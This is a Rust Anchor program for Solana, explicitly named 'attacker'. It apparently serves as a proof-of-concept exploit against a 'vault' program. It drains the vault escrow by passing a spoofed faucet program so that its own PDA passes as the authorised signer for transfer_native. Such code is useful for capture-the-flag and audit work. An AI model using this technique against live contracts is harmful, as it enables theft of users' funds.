use anchor_lang::prelude::*;
use vault::cpi::{accounts::TransferNative, transfer_native};
use vault::{program::Vault, Registry, ESCROW_SEED, REGISTRY_SEED, SIGNER_SEED};

declare_id!("GhB62wmFdADQeev3EkDpF9CahNmMbUd8RjDADWJg2ApR");

#[program]
pub mod attacker {
    use super::*;

    pub fn request(ctx: Context<Request>, amount: u64) -> Result<()> {
        let bump = ctx.bumps.signer_pda;
        let seeds: &[&[&[u8]]] = &[&[SIGNER_SEED, &[bump]]];

        transfer_native(
            CpiContext::new_with_signer(
                ctx.accounts.vault_program.to_account_info(),
                TransferNative {
                    registry: ctx.accounts.registry.to_account_info(),
                    from: ctx.accounts.vault_escrow.to_account_info(),
                    to: ctx.accounts.escrow.to_account_info(),
                    signer: ctx.accounts.signer_pda.to_account_info(),
                    faucet_program: ctx.accounts.faucet_program.to_account_info(),
                },
                seeds,
            ),
            amount,
        )
    }
}



#[derive(Accounts)]
pub struct Request<'info> {
    #[account(
        seeds = [REGISTRY_SEED],
        bump,
        seeds::program = vault_program,
    )]
    pub registry: Account<'info, Registry>,
    /// CHECK: escrow account
    #[account(
        mut,
        seeds = [ESCROW_SEED],
        bump,
        seeds::program = vault_program,
    )]
    pub vault_escrow: AccountInfo<'info>,
    /// CHECK: escrow account
    #[account(
        mut,
        seeds = [ESCROW_SEED],
        bump,
        seeds::program = faucet_program,
    )]
    pub escrow: AccountInfo<'info>,
    /// CHECK: signer account
    #[account(
        seeds = [SIGNER_SEED],
        bump,
        seeds::program = faucet_program,
    )]
    pub signer_pda: AccountInfo<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,
    /// CHECK: faucet program
    #[account(executable)]
    pub faucet_program: AccountInfo<'info>,
    pub vault_program: Program<'info, Vault>,
}
